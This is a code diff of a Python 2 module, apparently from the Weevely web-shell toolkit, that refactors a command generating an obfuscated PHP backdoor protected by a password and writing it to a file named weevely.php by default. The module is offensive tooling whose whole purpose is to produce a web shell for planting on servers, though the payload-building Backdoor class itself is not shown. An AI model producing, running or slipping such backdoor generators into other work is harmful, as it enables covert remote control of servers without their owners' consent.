@@ -1,27 +1,39 @@
-from core.parameters import ParametersList, Parameter as P
-from core.module import Module, ModuleException
+'''
+Created on 22/ago/2011
+
+@author: norby
+'''
+
+from core.moduleprobe import ModuleProbe
+from core.moduleexception import ModuleException
 from core.backdoor import Backdoor
 
 
-classname = 'Php'
+WARN_WRITING_DATA = 'Writing data'
 
-class Php(Module):
+class Php(ModuleProbe):
+    """Generate obfuscated PHP backdoor"""
 
-    params = ParametersList('Generate obfuscated PHP backdoor', [],
-                        P(arg='path', help='Path', default='weevely.php', pos=0))
+    def _set_args(self):
+        self.argparser.add_argument('pass', help='Password')
+        self.argparser.add_argument('lpath', help='Path of generated backdoor', default= 'weevely.php', nargs='?')
 
+    def _prepare_probe(self):
+        self.args['encoded_backdoor'] = Backdoor(self.args['pass']).backdoor
 
-    def __init__( self, modhandler , url, password):
-        """ Avoid to load default interpreter """
-        self.backdoor = Backdoor(password)
-        self.modhandler = modhandler
-        self.modhandler.interpreter = True
-        self.password = password
-	self.name = self.__module__
-
-    def run_module( self, filename ):
-        out = file( filename, 'wt' )
-        out.write( self.backdoor.backdoor )
-        out.close()
-
-        self.mprint("[%s] Backdoor file '%s' created with password '%s'." % ( self.name, filename, self.password ))
+    def _probe(self):
+        
+        try:
+            file( self.args['lpath'], 'wt' ).write( self.args['encoded_backdoor'] )
+        except Exception, e:
+            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
+        else:
+            self.mprint("Backdoor file '%s' created with password '%s'" % (self.args['lpath'], self.args['pass']))
+        
+        self._result =  self.args['lpath']
+        
+    def _output_result(self):
+        pass
+            
+                    
+        
